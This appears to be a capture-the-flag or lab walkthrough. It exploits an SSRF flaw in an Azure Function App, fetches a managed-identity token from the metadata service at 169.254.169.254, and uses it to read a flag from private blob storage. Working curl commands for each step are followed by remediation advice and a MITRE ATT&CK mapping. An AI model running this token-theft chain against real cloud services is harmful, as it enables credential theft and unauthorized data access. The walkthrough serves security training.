# Azure Function App SSRF to Managed Identity Token

**Provider:** Azure | **Category:** Serverless / SSRF / IMDS

## Scenario

An Azure Function App exposes an HTTP trigger at `/api/fetch` that accepts a `?url=` parameter
and returns the response body. The developer intended this for internal document fetching but
forgot to whitelist allowed URLs. The Function App has a **system-assigned managed identity**
with `Storage Blob Data Reader` on a private storage account containing the flag.

Abuse the SSRF to reach the **Instance Metadata Service (IMDS)**, obtain an OAuth token for
the storage resource, then use it to read the flag directly.

## Attack Path

```
[Attacker]
    |
    v
GET /api/fetch?url=http://169.254.169.254/metadata/identity/oauth2/token?...
    |
    v
JSON response contains access_token (Storage Blob Data Reader scope)
    |
    v
GET /secrets/flag.txt with Authorization: Bearer <token>
    |
    v
flag
```

### Step 1 — Probe the SSRF endpoint

```bash
FUNC_URL="<function_url>"   # e.g. https://fn-ssrf-123456.azurewebsites.net/api/fetch

curl "${FUNC_URL}?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01"
```

### Step 2 — Fetch an IMDS token for storage

```bash
TOKEN_URL="http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://storage.azure.com/"

curl "${FUNC_URL}?url=$(python3 -c "import urllib.parse; print(urllib.parse.quote('${TOKEN_URL}'))")"
```

Extract `access_token` from the JSON.

### Step 3 — Read the flag

```bash
STORAGE="<storage_account_name>"
TOKEN="<access_token>"

curl -H "Authorization: Bearer ${TOKEN}" \
     -H "x-ms-version: 2019-12-12" \
     "https://${STORAGE}.blob.core.windows.net/secrets/flag.txt"
```

## How to Fix in Production

1. **Validate and whitelist URLs** server-side — reject any request whose host resolves to RFC 1918 or link-local ranges (169.254.0.0/16, 10.0.0.0/8, etc.).
2. **Disable managed identity on untrusted functions** or scope it to the minimum required resource.
3. **Block IMDS access at the network layer** using Azure Policy or NSG rules where possible.
4. **Use Defender for App Service** to detect anomalous outbound connections to the metadata endpoint.
5. **Enable Azure Front Door / WAF** in front of the Function App with SSRF detection rules.

## MITRE ATT&CK Mapping

| Technique | ID |
|---|---|
| Server-Side Request Forgery | [T1190](https://attack.mitre.org/techniques/T1190/) |
| Unsecured Credentials: Cloud Instance Metadata API | [T1552.005](https://attack.mitre.org/techniques/T1552/005/) |
| Steal Application Access Token | [T1528](https://attack.mitre.org/techniques/T1528/) |
| Data from Cloud Storage | [T1530](https://attack.mitre.org/techniques/T1530/) |
